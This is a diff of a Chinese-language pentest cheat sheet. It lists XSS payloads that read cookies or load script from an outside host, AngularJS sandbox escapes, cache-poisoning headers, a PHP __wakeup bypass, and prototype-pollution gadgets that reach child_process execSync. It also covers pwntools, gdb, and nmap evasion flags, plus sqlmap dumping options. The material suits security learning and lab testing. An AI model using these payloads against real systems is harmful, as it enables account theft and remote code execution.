@@ -89,7 +89,7 @@ javascript:alert(document.cookie)
 <script src=http://xxx.com/xss.js></script>  
 <input onblur=alert("xss") autofocus><input autofocus>
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-变形绕过
+值得测试的语句
 ${alert(1)}
 \"-alert(1)}//
 %27x%27onclick=%27alert(1) 当用户按下访问键时，将调用该函数 在视窗上：ALT+SHIFT+X在 MacOS 上：CTRL+ALT+X在 Linux 上：Alt+X
@@ -101,7 +101,7 @@ ${alert(1)}
 %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 %3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%201%3E#x';</script>
 5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%2
-1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 绕过js沙箱
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1绕过js沙箱
 <input%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x js沙箱转义
 xss网址
 http://foo?&apos;-alert(1)-&apos;
@@ -380,12 +380,16 @@ ${{<%[%'"}}%\
 缓存中毒
 使用无效化参数cooike,miss缓存 ？Xxx=xxx
 X-Cache: hit 代表响应来自缓存
-利用头,利用两个头来绕过一些防护
+利用头绕过一些防护
 X-Forwarded-Host
 X-Forwarded-Scheme
 X-Host
-特定的主机头也会导致缓存中毒
-改变参数仍命中会导致参数反射进而导致xss
+1可以猜测缓存中毒头，参数
+2特定的主机头也会导致缓存中毒
+3改变参数仍命中会导致参数反射进而导致xss
+4导致js脚本缓存中毒会连带加载js的所有站点
+5如果使用分号将另一个参数追加到 ，缓存会将其视为单个参数。这意味着额外的参数也会从缓存键中排除。或者，在加载 Param Miner 后，右键单击请求并选择“批量扫描”>“Rails 参数隐身扫描”以自动识别漏
+6可以通过请求正文传入重复参数来控制响应中调用的函数的名称
 JWT签名
 标头、有效负载和签名
 eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
@@ -427,6 +431,7 @@ Ssrf
 针对后端系统 http://192.168.0.1:8080/xxx
 反序列化
 {“xx”,”xx”}
+1，当反序列化中出现路径有可能存在文件操控
 当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)
 O:4:"Name":类似这里的数字加1:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
 2is_valid()
@@ -453,8 +458,17 @@ Dom污染
 /?__pro__proto__to__.foo=bar 
 /?constconstructorructor.[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar
 Json
-"__proto__": { "foo":"bar" }
-"__proto__": { "isAdmin":true }
+"__proto__":{"foo":"bar"}
+"__proto__":{"isAdmin":true}
+"constructor":{"prototype": {"json spaces":10}}
+"__proto__": { "shell":"vim", "input":":! -cmdinjectpoc-\n" }
+json:cmdinject
+"__proto__":{"execArgv":["--eval=require('child_process').execSync('poc')"]}
+OAuth
+1，逻辑错误导致不正确的附加导致账号被错误绑定造成钓鱼
+<iframe src="xxx"></iframe>
+2,
+
 文件读取?file
 伪协议读入
 data://text/内容
@@ -474,39 +488,39 @@ Php
 5，X-Original-URL: 绕过访问限制
 pwn
 危险的函数
-函数    	 严重性    解决方案
-gets     	最危险    使用 fgets（buf, size, stdin）。这几乎总是一个大问题！
-strcpy   	很危险    改为使用 strncpy。
-strcat  	很危险    改为使用 strncat。
-sprintf 	很危险    改为使用 snprintf，或者使用精度说明符。
-scanf   	很危险    使用精度说明符，或自己进行解析。
-sscanf  	很危险    使用精度说明符，或自己进行解析。
-fscanf   	很危险    使用精度说明符，或自己进行解析。
-vfscanf  	很危险    使用精度说明符，或自己进行解析。
-vsprintf 	很危险    改为使用 vsnprintf，或者使用精度说明符。
-vscanf   	很危险    使用精度说明符，或自己进行解析。
-vsscanf  	很危险    使用精度说明符，或自己进行解析。
-streadd  	很危险    确保分配的目的地参数大小是源参数大小的四倍。
-strecpy  	很危险    确保分配的目的地参数大小是源参数大小的四倍。
-strtrns  	危险      手工检查来查看目的地大小是否至少与源字符串相等。
-realpath 	很危险   （或稍小，取决于实现）    分配缓冲区大小为 MAXPATHLEN。同样，手工检查参数以确保输入参数不超过 MAXPATHLEN。
-syslog   	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
-getopt   	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
-getopt_long 	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
-getpass   	很危险   （或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
-getchar   	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
-fgetc      	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
-getc      	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
-read      	中等危险   如果在循环中使用该函数，确保检查缓冲区边界。
-bcopy     	低危险     确保缓冲区大小与它所说的一样大。
-fgets      	低危险     确保缓冲区大小与它所说的一样大。
-memcpy  	低危险     确保缓冲区大小与它所说的一样大。
-snprintf   	低危险     确保缓冲区大小与它所说的一样大。
-strccpy    	低危险    确保缓冲区大小与它所说的一样大。
-strcadd    	低危险    确保缓冲区大小与它所说的一样大。
-strncpy    	低危险    确保缓冲区大小与它所说的一样大。
-vsnprintf  	 低危险    确保缓冲区大小与它所说的一样大。
-pythonpwntool编写方式
+函数    严重性    解决方案
+gets    最危险    使用 fgets（buf, size, stdin）。这几乎总是一个大问题！
+strcpy  很危险    改为使用 strncpy。
+strcat   很危险    改为使用 strncat。
+sprintf  很危险    改为使用 snprintf，或者使用精度说明符。
+scanf   很危险    使用精度说明符，或自己进行解析。
+sscanf  很危险    使用精度说明符，或自己进行解析。
+fscanf  很危险    使用精度说明符，或自己进行解析。
+vfscanf 很危险    使用精度说明符，或自己进行解析。
+vsprintf   很危险    改为使用 vsnprintf，或者使用精度说明符。
+vscanf    很危险    使用精度说明符，或自己进行解析。
+vsscanf   很危险    使用精度说明符，或自己进行解析。
+streadd   很危险    确保分配的目的地参数大小是源参数大小的四倍。
+strecpy   很危险    确保分配的目的地参数大小是源参数大小的四倍。
+strtrns    危险    手工检查来查看目的地大小是否至少与源字符串相等。
+realpath  很危险（或稍小，取决于实现）    分配缓冲区大小为 MAXPATHLEN。同样，手工检查参数以确保输入参数不超过 MAXPATHLEN。
+syslog    很危险（或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getopt    很危险（或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getopt_long 很危险（或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getpass   很危险（或稍小，取决于实现）    在将字符串输入传递给该函数之前，将所有字符串输入截成合理的大小。
+getchar   中等危险    如果在循环中使用该函数，确保检查缓冲区边界。
+fgetc      中等危险    如果在循环中使用该函数，确保检查缓冲区边界。
+getc      中等危险    如果在循环中使用该函数，确保检查缓冲区边界。
+read      中等危险    如果在循环中使用该函数，确保检查缓冲区边界。
+bcopy     低危险    确保缓冲区大小与它所说的一样大。
+fgets      低危险    确保缓冲区大小与它所说的一样大。
+memcpy  低危险    确保缓冲区大小与它所说的一样大。
+snprintf   低危险    确保缓冲区大小与它所说的一样大。
+strccpy    低危险    确保缓冲区大小与它所说的一样大。
+strcadd    低危险    确保缓冲区大小与它所说的一样大。
+strncpy    低危险    确保缓冲区大小与它所说的一样大。
+vsnprintf   低危险    确保缓冲区大小与它所说的一样大。
+pythonpwntool编写
 from pwn import *
 本地接口mia=process("./文件")
 远程端口mia=remote("ip",端口)
@@ -518,52 +532,52 @@ asm() 机器码转换
 mia.interactive()进入交互模式
 工具命令备忘
 Pwngdb
-命令		  缩写		效果
-gdb <file> <*pid>		添加新程序
-gdb attach <pid>		负载运行的程序
-set args <*argv>		设置程序运行参数
-show args		        查看设置好的运行参数
-quit	q	  	        退出gdb
-symbol <file> sy	        导入符号表
-info <*b>i	             	查看程序的状态/*查看断点
-frame	f	       		查看栈帧
-Backtrace bt	       		查看堆栈情况
-list	l	                显示源代码
+命令		         缩写		        效果
+gdb <file> <*pid>						添加新程序
+gdb attach <pid>						负载运行的程序
+set args <*argv>						设置程序运行参数
+show args		        			查看设置好的运行参数
+quit	q	  	        				退出gdb
+symbol <file> sy	        			导入符号表
+info <*b>i	             			查看程序的状态/*查看断点
+frame	f	       					查看栈帧
+Backtrace bt	       				    查看堆栈情况
+list	l	                			显示源代码
 (debug模式)
-Display disp	                跟踪查看某个变量
-start	s	                启动程序并中断在入口
-Debug         	                模式停在main()，否则停在start()
-run	r	                直接运行程序直到断点 x
-continue	  c	        暂停后继续执行程序
-next	n		        单步步过
-step	s	 		单步步入，函数跟踪
-finish	fin	 		跳出，执行到函数返回处
-break /*<addr>	  b		下断点
-watch				下内存断点并监视内存情况
-print	p			打印符号信息(debug模式)
-i r a				查看所有寄存器
-i r <esp/ebp..>			查看某个寄存器
-set $esp = 0x01			修改某个寄存器的值
-heap				查看分配的chunk
-vmmap				查看内存分配情况
-bin				查看 Bin 情况
-x /<num><n/f/u>			显示内存信息，具体用法附在下面
-context				打印 pwnbdg 页面信息
-dps <addr>			优雅地显示内存信息
-disassemble <func>		打印函数信息
-vmmap				显示程序内存结构
-search <*argv>			搜索内存中的值
-输入 search -h 			可查询用法
-checksec			查看程序保护机制
-parseheap			优雅地查看分配的chunk
-aslr <on/off>			打开/关闭 ASLR 保护
-pshow				显示各种踏板选项和其他设置
-dumpargs <num>			显示在调用指令处停止时传递给函数的参数
-dumprop <from> <to>		显示特定内存范围内的所有ROP gadgets
-elfheader			从调试的elf文件获取头信息
-elfsymbol			从ELF文件获取非调试符号信息
-procinfo			显示来自/proc/pid的各种信息
-readelf				从elf文件获取头信息
+Display disp	               		    跟踪查看某个变量
+start	s	               			    启动程序并中断在入口
+Debug         	                    模式停在main()，否则停在start()
+run	r	                			直接运行程序直到断点 x
+continue	  c	        				暂停后继续执行程序
+next	n		        				单步步过
+step	s	 							单步步入，函数跟踪
+finish	fin	 						跳出，执行到函数返回处
+break /*<addr>	  b					下断点
+watch								下内存断点并监视内存情况
+print	p							打印符号信息(debug模式)
+i r a									查看所有寄存器
+i r <esp/ebp..>						查看某个寄存器
+set $esp = 0x01						修改某个寄存器的值
+heap							查看分配的chunk
+vmmap							查看内存分配情况
+bin								查看 Bin 情况
+x /<num><n/f/u>					显示内存信息，具体用法附在下面
+context							打印 pwnbdg 页面信息
+dps <addr>						优雅地显示内存信息
+disassemble <func>				打印函数信息
+vmmap							显示程序内存结构
+search <*argv>					搜索内存中的值
+输入 search -h 					可查询用法
+checksec							查看程序保护机制
+parseheap						优雅地查看分配的chunk
+aslr <on/off>						打开/关闭 ASLR 保护
+pshow							显示各种踏板选项和其他设置
+dumpargs <num>					显示在调用指令处停止时传递给函数的参数
+dumprop <from> <to>				显示特定内存范围内的所有ROP gadgets
+elfheader							从调试的elf文件获取头信息
+elfsymbol						从ELF文件获取非调试符号信息
+procinfo							显示来自/proc/pid的各种信息
+readelf							从elf文件获取头信息
 nmap
 主机发现
 iR                                                       随机选择目标
@@ -571,77 +585,77 @@ iR                                                       随机选择目标
 -sL                                                      简单的扫描目标
 -sn                                                      Ping扫描-禁用端口扫描
 -Pn                                                      将所有主机视为在在线，跳过主机发现
--PS[portlist]                                           （TCP SYN ping） 需要root权限
--PA[portlist]                                           （TCP ACK ping）
--PU[portlist]                                           （UDP  ping）
--PY [portlist]                                          （SCTP ping）
+-PS[portlist]                                              （TCP SYN ping） 需要root权限
+-PA[portlist]                                              （TCP ACK ping）
+-PU[portlist]                                              （UDP  ping）
+-PY [portlist]                                             （SCTP ping）
 -PE/PP/PM                                                ICMP回显，时间戳和网络掩码请求探测
 -PO[协议列表]                                            IP协议Ping
 -n/-R                                                    从不执行DNS解析/始终解析[默认：有时]
---dns-servers                                            指定自定义DNS服务器
---system-dns                                             使用OS的dns服务器
---traceroute                                             跟踪到每个主机的跃点路径
+--dns-servers                                              指定自定义DNS服务器
+--system-dns                                              使用OS的dns服务器
+--traceroute                                                跟踪到每个主机的跃点路径
 扫描技术
--sS                                                      使用TCP的SYN进行扫描
--sT                                                      使用TCP进行扫描
+-sS                                                       使用TCP的SYN进行扫描
+-sT                                                       使用TCP进行扫描
 -sA                                                      使用TCP的ACK进行扫描
 -sU                                                      UDP扫描
--sI                                                      Idle扫描
+-sI                                                       Idle扫描
 -sF                                                      FIN扫描
--b<FTP中继主机>                                    	 FTP反弹扫描
+-b<FTP中继主机>                                    		 FTP反弹扫描
 端口规格和扫描顺序
 -p                                                       扫描指定端口
---exclude-ports                                          从扫描中排除指定端口
+--exclude-ports                                            从扫描中排除指定端口
 -f                                                       快速模式-扫描比默认扫描更少的端口
 -r                                                       连续扫描端口-不随机化
---top-ports                                              扫描<number>最常用的端口
+--top-ports                                               扫描<number>最常用的端口
 服务/版本探测
--sV                                                      探测服务/版本信息
---version-intensity                                      设置版本扫描强度（0-9）
---version-all                                            尝试每个强度探测
---version-trace                                          显示详细的版本扫描活动（用于调试）
+-sV                                                     探测服务/版本信息
+--version-intensity                                        设置版本扫描强度（0-9）
+--version-all                                             尝试每个强度探测
+--version-trace                                           显示详细的版本扫描活动（用于调试）
 脚本扫描
--SC                                                    	 等效于 --script=defult
---script = <lua scripts>,<lua scripts>                   以逗号分隔的目录，脚本文件或脚本类别
---script-args = <n1=v1, n2=v2>                 		 为脚本提供参数
---script-args-file=文件名                          	 从文件名中加载脚本参数
---script-trace                                           显示发送和接受的所有数据
---script-updatedb                                        更新脚本数据库
---script-help=<lua scripts>                      	 显示有关脚本的帮助
+-SC                                                   等效于 --script=defult
+--script = <lua scripts>,<lua scripts>                         以逗号分隔的目录，脚本文件或脚本类别
+--script-args = <n1=v1, n2=v2>                 			   为脚本提供参数
+--script-args-file=文件名                          		   从文件名中加载脚本参数
+--script-trace                                            显示发送和接受的所有数据
+--script-updatedb                                       更新脚本数据库
+--script-help=<lua scripts>                      		    显示有关脚本的帮助
 操作系统检测
--o                                                       启用os检测
---osscan-limit                                           将os检测限制为可能的目标
---osscan-guess                                       	 推测操作系统检测结果
+-o                                                    启用os检测
+--osscan-limit                                          将os检测限制为可能的目标
+--osscan-guess                                         推测操作系统检测结果
 时间和性能
---host-timeout                                         	 设置超时时间
+--host-timeout                                         设置超时时间
 --scan-delay                                          	 设置探测之间的时间间隔
--T  <0-5>                                                设置时间模板,值越小，IDS报警几率越低
+-T  <0-5>                                              设置时间模板,值越小，IDS报警几率越低
 防火墙/IDS规避和欺骗
 -f                                                       报文分段
--s                                                       欺骗源地址
--g                                                       使用指定的本机端口
---proxies <url,port>                                 	 使用HTTP/SOCK4代理
--data<hex string>                                   	 想发送的数据包中追加自定义的负载
---data-string                                            将自定义的ACSII字符串附加到发送数据包中
+-s                                                      欺骗源地址
+-g                                                      使用指定的本机端口
+--proxies <url,port>                                 	    使用HTTP/SOCK4代理
+-data<hex string>                                   	    想发送的数据包中追加自定义的负载
+--data-string                                             将自定义的ACSII字符串附加到发送数据包中
 --data-length                                            发送数据包时，附加随机数据
---spoof-mac                                              MAC地址欺骗
---badsum                                                 发送带有虚假TCP/UNP/STCP校验和的数据包
+--spoof-mac                                             MAC地址欺骗
+--badsum                                              发送带有虚假TCP/UNP/STCP校验和的数据包
 输出
--oN                                                      标准输出
--oX                                                      XMl输出
--oS                                                      script jlddi3
--oG                                                      grepable
--oA                                                      同时输出三种主要格式
--v                                                       信息详细级别
--d                                                       调试级别
---packet-trace                                           跟踪发送和接收的报文
---reason                                                 显示端口处于特殊状态的原因
---open                                                   仅显示开放的端口
+-oN                                                         标准输出
+-oX                                                         XMl输出
+-oS                                                         script jlddi3
+-oG                                                         grepable
+-oA                                                         同时输出三种主要格式
+-v                                                          信息详细级别
+-d                                                          调试级别
+--packet-trace                                                跟踪发送和接收的报文
+--reason                                                     显示端口处于特殊状态的原因
+--open                                                      仅显示开放的端口
 杂项
--6                                                       启动Ipv6扫描
--A                                                       启动Os检测，版本检测，脚本扫描和traceroute
--V                                                       显示版本号
--h                                                       帮助信息
+-6                                                          启动Ipv6扫描
+-A                                                          启动Os检测，版本检测，脚本扫描和traceroute
+-V                                                          显示版本号
+-h                                                          帮助信息
 sqlmap
 -dbs 脱库
 -tables 脱表
